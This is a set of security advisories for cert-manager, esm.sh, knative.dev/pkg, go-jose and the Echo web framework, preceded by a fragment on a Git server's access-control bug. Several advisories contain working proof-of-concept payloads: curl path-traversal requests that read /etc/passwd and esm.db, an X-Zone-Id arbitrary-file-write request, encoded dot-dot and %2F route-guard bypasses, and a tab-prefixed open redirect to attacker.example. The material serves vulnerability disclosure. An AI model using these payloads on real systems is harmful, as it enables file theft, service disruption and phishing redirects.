For a path that is not itself a repository, `AccessLevelForUser` returns the anonymous access level to anonymous callers and read-write to any authenticated user, since that is what allows a push to create a new repository. The go-get case therefore always matched for a sub-path, and the "don't hint that the repo exists" guard below it never ran.

`GoGetHandler` in `pkg/web/goget.go` then trimmed path segments with `path.Dir` until `be.Repository` succeeded, and rendered the first repository it found. It never asked whether the caller could read that repository. The access level the middleware had computed was for a different path.

Because the exception lived in the middleware shared by every Git route rather than on the go-get route, it also applied to the dumb-HTTP and LFS routes. There it skipped the `repo == nil` guard, and `serviceLfsBasicDownload` and `serviceLfsBasicUpload` dereferenced a nil repository from the request context. The sibling LFS handlers already checked for nil, which is why only those two panicked.

The Git and LFS routes behind `withAccess` had the opposite problem: each branch chose its own response for a caller who could not read the repository, and the choice depended on which condition failed first. On the smart HTTP routes a missing repository was checked before credentials, so it returned `404`, while a private one fell through to the credential prompt and returned `401`. On the LFS write routes the write-access check ran before the read check, so a signed-in user got `403` for a private repository and `404` for a missing one. And `parseJWT` in `pkg/web/auth.go` rejected a token for a missing repository with a "missing repository" erro

advisories.name: cert-manager: Direct ACME Challenge resources can bypass Issuer DNS01 solver policy and use ClusterIssuer DNS credentials
advisories.description:
## Summary

`Challenge` resources under `acme.cert-manager.io` can be created directly by namespace users. On create, cert-manager performs no admission validation tying the Challenge to an `Order`, an owner reference, or an Issuer-selected solver. The ACME Challenge controller then reconciles the direct resource and uses `Challenge.spec.solver` as the DNS01 provider configuration.

When the direct Challenge references a `ClusterIssuer`, cert-manager derives the DNS provider secret namespace and ambient-credential policy from the `ClusterIssuer` reference, but the DNS provider configuration itself is attacker-controlled through `Challenge.spec.solver`. This lets a namespace user bypass `Issuer`/`ClusterIssuer` solver selectors such as `dnsZones`, `dnsNames`, and `matchLabels`, and make the cert-manager controller use ClusterIssuer DNS credentials for attacker-selected provider settings and DNS names.

In the acme-dns case, this becomes credential disclosure because the attacker-controlled solver host receives the `X-Api-User` and `X-Api-Key` headers loaded by cert-manager from the ClusterIssuer resource namespace.

## Attack preconditions

- The attacker can create `challenges.acme.cert-manager.io` resources in at least one namespace.
- The cert-manager controller is running and reconciles ACME `Challenge` resources cluster-wide.
- A usable `ClusterIssuer` exists in the cluster.
- The referenced `ClusterIssuer` has a DNS01 solver that uses a Secret in the cluster resource namespace, or relies on ambient credentials enabled for `ClusterIssuer`.
- The cluster is multi-tenant or otherwise separates namespace users from platform-owned Issuer/ClusterIssuer and DNS credential administration.

## Severity

Rationale: a tenant with namespace-level ACME Challenge create permissions, including permissions granted by cert-manager's aggregate edit role, can cause a cluster-scoped controller to use DNS credentials or ambient cloud credentials outside the Issuer's intended solver policy. With acme-dns specifically, this can disclose the referenced acme-dns account credential to an attacker-controlled endpoint. With other DNS providers, the impact is credential use, Issuer policy bypass, and unauthorized DNS mutation risk unless a provider-specific credential disclosure path is separately demonstrated.

## Why this is not just RBAC misconfiguration

cert-manager's documented end-user workflow does not require users to manually create `Challenge` resources. Challenges are internal ACME workflow objects generated from Orders after cert-manager has selected a solver from the referenced Issuer or ClusterIssuer. If default or aggregate roles grant namespace users permission to create these resources, the controller still should not treat a user-controlled `Challenge.spec.solver` as authoritative for a referenced `ClusterIssuer`.

The security boundary is the Issuer/ClusterIssuer solver policy and credential configuration. Direct Challenge creation bypasses that boundary because the controller derives credential namespace and ambient credential permission from `issuerRef`, while accepting the DNS provider configuration from the untrusted Challenge object.

## Affected components

- ACME Challenge admission validation
- ACME Challenge controller
- DNS01 solver selection and DNS provider construction
- Default aggregate RBAC for `challenges.acme.cert-manager.io`

## Affected versions tested

The issue was reproduced on:

- `master` commit `2c0f1a6a4`
- latest production release `v1.20.2` commit `e5b7b1845`
- `v1.19.5` commit `cda7b7896`
- `v1.18.6` commit `4699caabb`

See `VERSION_TEST_MATRIX.md` for the command matrix and outputs.

## Technical details

Relevant code paths:

- `internal/apis/acme/validation/challenge.go:44-45`: `ValidateChallenge` returns no errors on create.
- `deploy/crds/acme.cert-manager.io_challenges.yaml`: `spec.solver` is a required user-controlled field on `Challenge`.
- `pkg/controller/acmechallenges/scheduler/scheduler.go:51-58`: scheduler lists all Challenges.
- `pkg/controller/acmechallenges/controller.go:180-197`: scheduler sets `status.processing=true`.
- `pkg/controller/acmechallenges/sync.go:139-183`: controller loads the referenced Issuer and then presents the Challenge.
- `pkg/issuer/acme/dns/dns.go:81`: DNS solver `Present` ignores the issuer object argument.
- `pkg/issuer/acme/dns/dns.go:180-187`: DNS provider config and resource namespace are derived from `Challenge.spec`.
- `pkg/controller/helper.go:39-44`: `ClusterIssuer` references use the cluster resource namespace.
- `pkg/controller/helper.go:66-72`: ambient credentials are allowed based on `issuerRef.kind`.
- `internal/apis/config/controller/v1alpha1/defaults.go:68-69`: ClusterIssuer ambient credentials default to enabled.
- `deploy/charts/cert-manager/templates/rbac.yaml:517-519`: the aggregate edit role can create/update `challenges` and `orders`.

The normal `Order` flow selects a solver from the Issuer:

- `pkg/util/solverpicker/so

esm.sh has File Inclusion issue
advisories.description: ## Summary A Local File Inclusion (LFI) issue was identified in the esm.sh service URL handling. An attacker could craft a request that causes the server to read and return files from the host filesystem (or other unintended file sources). **Severity:** High — LFI can expose secrets, configuration files, credentials, or enable further compromise. **Impact:** reading configuration files, private keys, environment files, or other sensitive files; disclosure of secrets or credentials; information leakage that could enable further attacks. Vulnerable code snippet is in this file: https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168 --- ## Proof of Concept 1. Using this default config file that I copy from the repo, the server is running at `http://localhost:9999` with this command `go run server/esmd/main.go --config=config.json` ```json { "port": 9999, "npmRegistry": "https://registry.npmjs.org/", "npmToken": "******" } ``` 2. Trigger the LFI vulnerability by sending this command below to read a local file ```bash # read /etc/passwd curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1' # or read the database esm.db file curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../esm.db?raw=1&module=1' ``` --- ## Remediation Simply remove any `..` in the URL path before actually process the file. See more details in [this guide](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) ## Credits - [Ai Ho (Jessie)](https://github.com/j3ssie) - [CL Yang](https://github.com/A11riseforme)

advisories.name: esm.sh has arbitrary file write via path traversal in `X-Zone-Id` header
advisories.description: ## Summary A path-traversal flaw in the handling of the `X-Zone-Id` HTTP header allows an attacker to cause the application to write files outside the intended storage location. The header value is used to build a filesystem path but is not properly canonicalized or restricted to the application’s storage base directory. As a result, supplying `../` sequences in `X-Zone-Id` causes files to be written to arbitrary directories (example observed: `~/.esmd/modules/transform//` instead of `~/.esmd/storage/modules/transform`). **Severity:** Medium **Component / Endpoint:** `POST /transform` — handling of `X-Zone-Id` header The vulnerable code is in https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L116 and https://github.com/esm-dev/esm.sh/blob/main/server/router.go#L411 **Impact:** Arbitrary file creation / overwrite outside intended storage directory (file write to attacker-controlled path). Possible remote code execution, persistence, tampering with application files, or facilitating further path-traversal attacks. --- ## Proof of Concept (POC) Request (attacker-supplied `X-Zone-Id` contains path traversal): ``` POST /transform HTTP/1.1 Host: localhost:8888 User-Agent: Den/8.7.1 Accept: */* Connection: keep-alive Referer: http://localhost:9999/ Content-Type: application/json X-Zone-Id: ../../modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/ Content-Length: 325 { "filename": "example2.js", "lang": "js", "code": "console.log('hello');", "importMap": { "imports": { "react": "https://esm.sh/react", "react-dom": "https://esm.sh/react-dom" } }, "jsxImportSource": "react", "target": "es2022", "sourceMap": "external", "minify": true } ``` Observed result: file written to `~/.esmd/modules/transform/c245626ef6ca0fd9ee37759c5fac606c6ec99daa/example2.js` instead of the intended `~/.esmd/storage/modules/transform/`. This can be trigger with another path traversal request below ``` GET /+c245626ef6ca0fd9ee37759c5fac606c6ec99daa./../../../esm.db?.css HTTP/1.1 Host: localhost:8888 User-Agent: localhost Accept: */* Connection: keep-alive X-Zone-Id: ../ Referer: http://localhost:9999/ ``` --- ## Remediation Simply remove any .. in the `X-Zone-Id` header before actually process the file. ## Credits - [Ai Ho (Jessie)](https://github.com/j3ssie) - [CL Yang](https://github.com/A11riseforme)

advisories.name: knative.dev/pkg admission webhooks allow unbounded request-body memory exhaustion
advisories.description:
## ⚠️ Update (verification, 2026-05-19): C-2 confirmed end-to-end — **4.5× amplification observed** (worse than the advisory's conservative 2× claim)

Built a Go PoC ([`cmd/poc-c2/main.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/cmd/poc-c2/main.go)) that runs the exact 8-line vulnerable snippet from [`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117) verbatim under the same `http.HandlerFunc` shape (the full production `admissionHandler` at `:85` requires `*Webhook` + `AdmissionController` + an informer-synced channel + controller-runtime / client-go scaffolding — the bug is the missing `http.MaxBytesReader`, nothing else in the handler). Bound to `127.0.0.1:18098`.

PoC client streamed 2 GiB of `a` bytes over a raw TCP socket. `runtime.MemStats.HeapAlloc` sampler:

```
baseline:  HeapAlloc =     0.32 MiB
peak:      HeapAlloc = 9 217.38 MiB  =  9.00 GiB
ratio:     4.50× the body size
```

The advisory predicted ~2× from `io.TeeReader` doubling the body once in `bodyBuffer`. The observed 4.5× ratio comes from the interaction of two amplifiers: `bytes.Buffer.ReadFrom` (used by `TeeReader`-fed `bodyBuffer`) doubles its backing slice on every grow, so peak occupancy during a realloc is `old + new = 3×` the live data — and `json.Decoder` holds its own working buffer in parallel. The advisory's 2× floor is comfortably exceeded.

**Downstream impact reminder**: this library backs every Knative serving / eventing controller, every Tekton Triggers / Pipelines webhook, KEDA, Sigstore policy-controller, Kpack, and many more. A 2 GiB body to **any** of those projects' admission webhook ports OOMs the controller at 4.5× the body — i.e., even a 128 MiB request OOMs a 512 MiB-limited Pod.

---

# Summary

`knative.dev/pkg`'s admission webhook handler reads the incoming HTTP request body via `json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer))` with **no `http.MaxBytesReader` wrapping the body**. Because every consumer of `knative.dev/pkg/webhook` inherits this handler (Knative serving / eventing, Tekton Pipelines, KEDA, Sigstore policy-controller, and others), a single oversized POST to **any of those projects' admission webhook ports** drives the controller pod into memory exhaustion and OOM-kill. Worse, the `io.TeeReader` design keeps a verbatim copy of the body in `bodyBuffer` while the decoder also materializes the parsed struct — so the peak memory usage is roughly **twice the body size**.

This is the same shape as **CVE-2026-24514** (ingress-nginx) and `GHSA-9539-c3xr-w9vm` (Kyverno admission body OOM) filed today against the same antipattern.

# Affected versions

- `knative.dev/pkg` — `main` HEAD on `github.com/knative/pkg` (verified 2026-05-18 against [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) sha `1ad5a1ce0ee7043081cb50fd1acc6d36a9126844`).
- Every release that ships the current [`webhook/admission.go`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go) handler.

# Vulnerable code

[`webhook/admission.go:109-117`](https://github.com/knative/pkg/blob/1ad5a1ce0ee7043081cb50fd1acc6d36a9126844/webhook/admission.go#L109-L117):

```go
review := admissionv1.AdmissionReview{}
var bodyBuffer bytes.Buffer
if err := json.NewDecoder(io.TeeReader(r.Body, &bodyBuffer)).Decode(&review); err != nil {
    http.Error(w, fmt.Sprintf("could not decode body: %v", err), http.StatusBadRequest)
    return
}
```

There is no `http.MaxBytesReader` around `r.Body`. The standard library's `json.NewDecoder` will read until EOF or the matching closing `}`. The `io.TeeReader` simultaneously copies every byte read from `r.Body` into `bodyBuffer`, which the rest of the handler uses for the response trailer / observability.

# Downstream impact (the reason this matters)

`knative.dev/pkg/webhook` is the **default admission-webhook scaffolding for the entire Knative + CNCF webhook ecosystem**:

| Consumer | Repo | Webhook surface |
|---|---|---|
| Knative serving | `knative/serving` | resource validation / defaulting |
| Knative eventing | `knative/eventing` | resource validation / defaulting |
| Tekton Pipelines | `tektoncd/pipeline` | Pipeline / Task / TaskRun validation |
| Tekton Triggers | `tektoncd/triggers` | EventListener / Trigger validation |
| KEDA | `kedacore/keda` | ScaledObject / ScaledJob validation |
| Sigstore policy-controller | `sigstore/policy-controller` | ClusterImagePolicy mutating + validating |
| Kpack | `buildpacks-community/kpack` | Image / Builder validation |
| ... | | |

Every one of these consumers ships the same `io.ReadAll`-equivalent body read with **no upper bound**. A pod-network-reachable attacker can OOM-kill any of them with a single large POST. `failurePolicy=Fail` admission webhooks (the secure-default) then take the namespace's or cluster's admission fl

advisories.name: Go JOSE: Panics in JSON parsing
advisories.description:
### Summary

Parsing deeply nested JSON structures can hit Go's stack limit, causing the application to crash.

Note: this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Impact

Denial of service vulnerability. Any application that parses untrusted JSON via go-jose is exposed.

### Workarounds

Reject large inputs before parsing them.

### Acknowledgements

Thanks to Dohyun Kim (@azza999), Joshua Rogers of AISLE Research, and Sueun Cho for alerting us to the need to patch this.

advisories.name: Go JOSE: Panic during CBC-HMAC processing
advisories.description:
### Summary

Decrypting a ciphertext with "A128CBC-HS256", "A192CBC-HS384", or "A256CBC-HS512" can result in a panic on untrusted input.

Note this advisory is the same as https://github.com/go-jose/go-jose/security/advisories/GHSA-6mp9-8xrw-74r4.

### Details

Insufficient validation of parameters can lead to attempting to index into an empty buffer. See https://github.com/go-jose/go-jose/pull/292.

### Workarounds

If the application does not require the CBC-HMAC modes for content encryption, and is using github.com/go-jose/go-jose/v4, do not include them in the list of ContentEncryption algorithms passed to ParseEncrypted / ParseEncryptedJSON / ParseEncryptedCompact.

### Impact

Denial of service vulnerability. Any application which decrypts untrusted ciphertexts with the indicated algorithms is affected.

### Acknowledgements

Thanks to Joshua Rogers of AISLE Research for reporting this problem.

advisories.name: Echo: HTTPS Redirect and HSTS Bypass via Unconditional Trust of Forwarded Scheme Headers
advisories.description:
## Description

`Context.Scheme()` unconditionally trusts four client-controlled HTTP headers to determine the request scheme, with no mechanism to configure trusted sources. This allows a remote unauthenticated attacker to bypass HTTPS redirect enforcement and suppress HSTS headers.

The trusted headers (checked in this order of precedence):
1. `X-Forwarded-Proto`
2. `X-Forwarded-Protocol`
3. `X-Forwarded-Ssl`
4. `X-Url-Scheme`

### Threat model

**Scenario A — Directly exposed application (vulnerable by default):**
The Echo application listens on HTTP and is reachable directly by clients (no L7 proxy in front), or an attacker can bypass the proxy and reach the backend directly. In this case, the attacker has full control over all request headers. Sending `X-Forwarded-Proto: https` defeats the `HTTPSRedirect` middleware entirely — traffic stays on plaintext HTTP, enabling man-in-the-middle attacks.

This is the primary scenario. The application is vulnerable by default with no misconfiguration required — simply using `e.Pre(middleware.HTTPSRedirect())` as documented is sufficient.

**Scenario B — Behind L7 proxy with header sanitization (reduced risk):**
If the application is strictly behind a correctly configured L7 proxy that always overwrites `X-Forwarded-Proto` and there is no direct access to the backend, the practical risk is lower. However, this relies on perimeter controls external to the framework, not on the framework itself. As Echo's own IP-extraction documentation states: *"you must not trust HTTP headers unconditionally."*

### Root cause

`context.go`, lines 161–181:

```go
func (c *Context) Scheme() string {
    if c.IsTLS() {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProto); scheme != "" {
        return scheme
    }
    if scheme := c.request.Header.Get(HeaderXForwardedProtocol); scheme != "" {
        return scheme
    }
    if ssl := c.request.Header.Get(HeaderXForwardedSsl); ssl == "on" {
        return "https"
    }
    if scheme := c.request.Header.Get(HeaderXUrlScheme); scheme != "" {
        return scheme
    }
    return "http"
}
```

Two additional issues with this implementation:

1. **No value validation.** `Scheme()` returns any arbitrary string from the header, not just `"http"` or `"https"`. This breaks the documented contract ("returns the HTTP protocol scheme, `http` or `https`") and causes unexpected behavior in middleware that uses the return value to construct URLs (e.g., `WWWRedirect` builds `scheme + "://www." + host + uri`).

2. **Consumed by security-critical middleware.** The return value is used directly by redirect middleware (`middleware/redirect.go:136`) and secure middleware (`middleware/secure.go:125`) for security enforcement decisions.

### Affected components

| Component | File | Line(s) | Impact |
|-----------|------|---------|--------|
| `Context.Scheme()` | `context.go` | 161–181 | Returns attacker-controlled scheme |
| `HTTPSRedirect` | `middleware/redirect.go` | 147–151 | HTTPS enforcement bypassed |
| `HTTPSWWWRedirect` | `middleware/redirect.go` | 154–161 | HTTPS enforcement bypassed |
| `HTTPSNonWWWRedirect` | `middleware/redirect.go` | 163–170 | HTTPS enforcement bypassed |
| `WWWRedirect` | `middleware/redirect.go` | 172–177 | URL constructed with arbitrary scheme |
| `NonWWWRedirect` | `middleware/redirect.go` | 179–184 | URL constructed with arbitrary scheme |
| Secure middleware (HSTS) | `middleware/secure.go` | 125 | HSTS header suppressed |

### This is an unsafe-by-default API surface, not just misconfiguration

This behavior is not accidental — it is codified in the project's own test suite. For example, `middleware/redirect_test.go` (lines 29–34) explicitly asserts that `X-Forwarded-Proto: https` on an HTTP request results in 200 OK (no redirect):

```go
{
    whenHost:         "labstack.com",
    whenHeader:       map[string][]string{echo.HeaderXForwardedProto: {"https"}},
    expectLocation:   "",
    expectStatusCode: http.StatusOK,
},
```

Similarly, `middleware/secure_test.go` (lines 42–53) and `context_test.go` (lines 1104–1111) assert that scheme is derived from the header.

The problem is not that the framework *can* use forwarded headers — that is legitimate behind a trusted proxy. The problem is that **there is no mechanism to control whether this trust is appropriate**, unlike the existing IP header trust model. `Scheme()` always trusts the headers, making any middleware that depends on it unsafe-by-default.

### Inconsistency with existing trust model

Echo already recognizes this class of header-trust vulnerability for IP addresses. The `IPExtractor` mechanism with `TrustOption` (`TrustLoopback`, `TrustPrivateNet`, `TrustLinkLocal`, `TrustIPRange`) was introduced specifically because:

> *"you must not trust HTTP headers unconditionally. Otherwise, you might give someone a chance of deceiving you. **A security risk!**"*
> — `ip.go`, lines 20–21

> *"If you put no proxy (e.g., directly

advisories.name: Echo static file middleware route protection bypass via encoded dot-dot traversal
advisories.description:
## Summary

Echo v5.2.0 contains a bypass of the fix for GHSA-vfp3-v2gw-7wfq. The fix rejects encoded path separators such as `%2F` and `%5C` before static file path unescaping, but two traversal forms still bypass route-level middleware protections for static files.

The primary bypass uses encoded dot-dot segments. A request such as `/public/%2E%2E/admin/secret.txt` passes the encoded-separator guard, is unescaped to `public/../admin/secret.txt`, then `path.Clean` resolves it to `admin/secret.txt`. If `/admin/*` is protected by middleware but the static filesystem is mounted at `/`, the protected file is returned through the public static route.

A second bypass exists when `UseEscapedPathForMatching=true`. In that mode, the router normalizes encoded separators before the static handler checks the wildcard. The handler receives a decoded wildcard with no `%` characters, so the encoded-separator guard does not run on the original encoded path.

## Impact

An unauthenticated attacker can read files that an application intended to protect with route-level middleware, when those files are also reachable through a static filesystem mount after path normalization.

The high-severity variant works with the default router configuration and requires only encoded dot-dot path segments. The direct protected route returns 403, while the public static route returns the protected file content.

The `UseEscapedPathForMatching=true` variant is lower severity because it requires a non-default router configuration.

## Affected versions

Tested vulnerable:

- `github.com/labstack/echo/v5` v5.2.0
- Current `master` at `5786024ea4d85c01784796e8aa7aac53e007b39b`

No patched version is currently known.


## Policy and version checks

GitHub Private Vulnerability Reporting is enabled for `labstack/echo`. The repository has a root `SECURITY.md` and accepts security reports through GitHub Security Advisories.

The vulnerable code was revalidated on both current `master` and the latest release tag:

- Current `master`: `5786024ea4d85c01784796e8aa7aac53e007b39b`
- Latest release: `v5.2.0`, published June 14 2026
- Package: `github.com/labstack/echo/v5`

The same focused Go tests pass on the checked out `v5.2.0` / `master` commit, proving the bypass remains present in the latest released version and latest main branch at the time of reporting.

## Reproduction

The following application shape reproduces the high-severity bypass:

```go
e := echo.New()

g := e.Group("/admin", func(next echo.HandlerFunc) echo.HandlerFunc {
    return func(c echo.Context) error {
        return echo.NewHTTPError(http.StatusForbidden)
    }
})
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)
```

Control request:

```http
GET /admin/secret.txt
```

Observed result:

```text
403 Forbidden
```

Bypass request:

```http
GET /public/%2E%2E/admin/secret.txt
```

Observed result:

```text
200 OK
TOP-SECRET
```

For the non-default router variant:

```go
e := echo.New()
e.router = echo.NewRouter(echo.RouterConfig{
    UseEscapedPathForMatching: true,
})

g := e.Group("/admin", authMiddlewareReturning403)
g.GET("/*", handler)

e.StaticFS("/", fsysWithAdminSecret)
```

Bypass request:

```http
GET /public%2F..%2Fadmin%2Fsecret.txt
```

Observed result:

```text
200 OK
TOP-SECRET
```

## Proof of concept evidence

I added focused tests against the current Echo codebase. The tests exercise both `StaticDirectoryHandler` and the static middleware path.

Command:

```bash
go test -run TestHostile -v ./...
```

Observed result:

```text
=== RUN   TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked
--- PASS: TestHostile_StaticDirectoryHandler_EncodedSeparatorsBlocked (0.00s)
=== RUN   TestHostile_StaticDirectoryHandler_EncodedDotDotBypass
--- PASS: TestHostile_StaticDirectoryHandler_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_UseEscapedPathForMatching_Bypass
--- PASS: TestHostile_UseEscapedPathForMatching_Bypass (0.00s)
PASS
ok  github.com/labstack/echo/v5  0.013s
=== RUN   TestHostile_StaticMiddleware_EncodedSeparatorsBlocked
--- PASS: TestHostile_StaticMiddleware_EncodedSeparatorsBlocked (0.01s)
=== RUN   TestHostile_StaticMiddleware_EncodedDotDotBypass
--- PASS: TestHostile_StaticMiddleware_EncodedDotDotBypass (0.00s)
=== RUN   TestHostile_StaticMiddleware_DisablePathUnescaping
--- PASS: TestHostile_StaticMiddleware_DisablePathUnescaping (0.00s)
PASS
ok  github.com/labstack/echo/v5/middleware  0.012s
```

The control tests also confirm that the new fix blocks encoded separators such as `%2F`, `%5C`, double-encoded slash values, null bytes, and overlong slash encodings.

## Root cause

The fix for GHSA-vfp3 uses a denylist-style guard that checks for encoded path separators before unescaping the static wildcard. This blocks `%2F` and `%5C`, but does not block encoded traversal segments such as `%2E%2E`.

The vulnerable flow is:

1. The static route wildcard accepts `public/%2E%2E/admin/secret.txt`.
2. The encoded-separator guard sees no `%2F`

advisories.name: Echo has a Static Middleware Double-Unescape Path Traversal
advisories.description:
## Summary

Commit a9ede66a (PR #3006, issue #2599) silently fixed a path traversal vulnerability in the Echo web framework's static file middleware.

## Vulnerability

The static middleware double-unescaped URL paths. Go's net/http already decodes Request.URL.Path, but middleware/static.go unconditionally called url.PathUnescape() again:

```go
// BEFORE (vulnerable)
pathUnescape := true
```

This reassembled path traversal sequences from double-encoded input. An attacker could send GET /%2e%2e%2fsecret.txt or /..%252fsecret.txt and the double-unescape would produce ../secret.txt.

## Fix
```go
// AFTER (fixed)
pathUnescape := false
```

The commit's test TestStatic_percentEncodedTraversalIsBlocked explicitly verifies traversal vectors are blocked.

## Impact
Arbitrary file read from server filesystem via percent-encoded path traversal.

## References
- Fix: https://github.com/labstack/echo/commit/a9ede66a
- Issue: https://github.com/labstack/echo/issues/2599
- PR: https://github.com/labstack/echo/pull/3006

## Patches

Fixed in `github.com/labstack/echo/v5` v5.2.0 and `github.com/labstack/echo/v4` v4.15.3, where the Static middleware stopped unescaping an already decoded path. Maintainer analysis: reading files outside the configured root could not be reproduced; the confirmed impact was that a double-encoded slash (`%252F`) could reach a file under a guarded route when the Static middleware is registered globally. Upgrade to v5.4.0 / v4.16.0 or later, which also includes related fixes for encoded and dot-segment paths.

## Workarounds

Keep files that need protection outside the Static middleware's root directory.

advisories.name: Echo has Open Redirect via Control-Character Prefix Defeating sanitizeURI
advisories.description:
## Summary

Echo's dedicated open-redirect guard, `sanitizeURI`, decides whether a redirect target is a local path by inspecting exactly two byte positions: `uri[0]` and `uri[1]`. If the value begins with a control character such as a tab or a newline, followed by a separator pair, the guard does not fire and the value is written to the `Location` header unchanged.

Browsers remove tab and newline characters from URLs before parsing them, and treat a backslash as a forward slash for HTTP and HTTPS URLs. A `Location` value of ``/\t/attacker.example`` is therefore resolved by the browser as an absolute URL on `attacker.example`. Confirmed end to end in a headless browser.

## Technical background

### The guard

`middleware/slash.go:144` (duplicated verbatim at `echo.go:958`):

```go
func sanitizeURI(uri string) string {
	// double slash `\\`, `//` or even `\/` is absolute uri for browsers and by redirecting request to that uri
	// we are vulnerable to open redirect attack. so replace all slashes from the beginning with single slash
	if len(uri) > 1 && (uri[0] == '\\' || uri[0] == '/') && (uri[1] == '\\' || uri[1] == '/') {
		uri = "/" + strings.TrimLeft(uri, `/\`)
	}
	return uri
}
```

The condition is anchored at absolute offsets 0 and 1. It cannot see a separator that has been shifted by one byte.

### Data flow

1. `RemoveTrailingSlash` (`middleware/slash.go:112-140`) reads `url.Path`, which `net/http` has already percent-decoded, strips the trailing slash, and appends the raw query string:

```go
path := url.Path
...
if l > 0 && strings.HasSuffix(path, "/") {
    path = path[:l]
    uri := path
    if qs != "" {
        uri += "?" + qs
    }
    if config.RedirectCode != 0 {
        return c.Redirect(config.RedirectCode, sanitizeURI(uri))   // line 132
    }
```

2. `AddTrailingSlash` does the same in the opposite direction at `middleware/slash.go:67`.

3. A request for `/%09/attacker.example/x/` has `url.Path` equal to `"/\t/attacker.example/x/"` (a literal TAB byte). `sanitizeURI` evaluates `uri[0] == '\t'`, the condition is false, and the value passes through untouched.

4. `Context.Redirect` (`context.go:735`) writes it to the `Location` header. Go's header writer removes CR and LF but leaves TAB, which is all that is required.

### Conditional analysis

- Guard: `uri[0]` and `uri[1]` are separators. Trust boundary: server-side sanitization of attacker-influenced path data.
- Bypass: place a single control byte before the separator pair. The separator moves to index 1 and the guard's second condition (`uri[1]` being a separator) is never reached because the first condition (`uri[0]` being a separator) already failed.
- Browser-side trust boundary: the client's URL parser. It is adversary favourable: control characters are stripped and backslashes are normalized before scheme and authority parsing. The attacker does not need any server-side weakness beyond producing the malformed `Location`.

Note that the newline variant does not survive: `net/http` replaces CR and LF in header values. TAB does survive, and TAB alone is sufficient because the browser strips it.

## Proof of concept

**Attached PoC:** `ECHO-2026-002_poc.zip` (in this directory). Extract it and follow
`ECHO-2026-002/README.md` for the full walkthrough. The archive contains a
self-contained Go module (`go.mod`, `go.sum`, `main.go`, `README.md`).

[ECHO-2026-002_poc.zip](https://github.com/user-attachments/files/32133975/ECHO-2026-002_poc.zip)

Quick start:

```bash
unzip ECHO-2026-002_poc.zip
cd ECHO-2026-002
# edit go.mod: point the replace directive at your Echo checkout
sed -i 's|=> .*|=> /absolute/path/to/echo|' go.mod
GOFLAGS=-mod=mod go run .          # in-process check
GOFLAGS=-mod=mod go run . -serve   # real listener on 127.0.0.1:18002
```

### Environment used for verification

- OS: Linux 6.18.33.2-microsoft-standard-WSL2, x86_64
- Go: go1.27.0 linux/amd64
- Target: Echo v5.3.1 (module `github.com/labstack/echo/v5`)
- Browser: headless Chromium drove the end-to-end confirmation

### The vulnerable configuration

```go
package main

import (
    "net/http"

    "github.com/labstack/echo/v5"
    "github.com/labstack/echo/v5/middleware"
)

func main() {
    e := echo.New()
    e.Pre(middleware.RemoveTrailingSlashWithConfig(middleware.RemoveTrailingSlashConfig{
        RedirectCode: http.StatusMovedPermanently,
    }))
    e.GET("/", func(c *echo.Context) error { return c.String(200, "home") })
    _ = e.Start("127.0.0.1:18002")
}
```

***

### Reproduction

In-process check. The program requests five path shapes and applies the browser
URL-parsing steps that matter (strip TAB, LF, CR; treat a backslash as a slash; a
leading `//` starts an authority):

```bash
GOFLAGS=-mod=mod go run .
```

```
GET                          code   Location (control chars shown) browser navigates to
/normal/path/                301    /normal/path           (victim origin)
                             control: ordinary path, sanitized correctly
/%0

advisories.name: Echo's middleware.Static: `%2F`-encoded path bypasses route/group middleware guarding a statically-served path
advisories.description:
## Summary

When `middleware.Static` is mounted globally (`e.Use(middleware.Static(...))`) and an application relies on a **route- or group-level middleware guard** to restrict a path that also falls under the served static root, a `%2F`-encoded request bypasses that guard while the file is still served. This is the same encoding/decoding mismatch fixed for `StaticFS`/`StaticDirectoryHandler` in CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq, but the fix did not cover the `middleware.Static` path. In addition, the `StaticConfig.EnablePathUnescaping` docstring states the default configuration prevents exactly this bypass, which is inaccurate for the global-mount case.

**This is not path traversal:** no file outside the static root is accessed. The served file lives inside the static root; the issue is that access-control expectations set by a route guard are inconsistent between the literal and `%2F`-encoded forms of the same path.

## Details

Root cause — the router and the static handler disagree on how to interpret `%2F`:

- The router matches routes on the **raw, still-encoded** path, so `GET /admin%2Fsecret.txt` does **not** match a `/admin/...` route or group; any middleware attached to that route/group is therefore skipped.
- `middleware.Static` selects its path source in `middleware/static.go` (~L219): with a global `e.Use` mount there is no wildcard route, so it uses `c.Request().URL.Path`, which `net/http` has already **decoded** (`%2F` → `/`). It then `path.Clean`s (~L235) and `Open`s (~L259) `admin/secret.txt`, serving the file.

Net effect: for the literal path the guard runs; for the `%2F`-encoded path the guard is skipped but the same file is served.

Relevant code:
- `middleware/static.go` ~L219 (`p := c.Request().URL.Path`), ~L235 (`path.Clean`), ~L259 (`currentFS.Open`)
- `StaticConfig.EnablePathUnescaping` docstring (`static.go` ~L60-67) — claims the default prevents the `/admin%2fprivate.txt` → `/admin/*` guard bypass; this is not true for the global mount.

Relationship to prior advisories:
- **CVE-2026-55677 / GHSA-vfp3-v2gw-7wfq** (patched 5.2.0): same `%2F` router-vs-handler mismatch, but fixed for `StaticFS`/`StaticDirectoryHandler`. The `middleware.Static` path was not covered — this report is that gap.
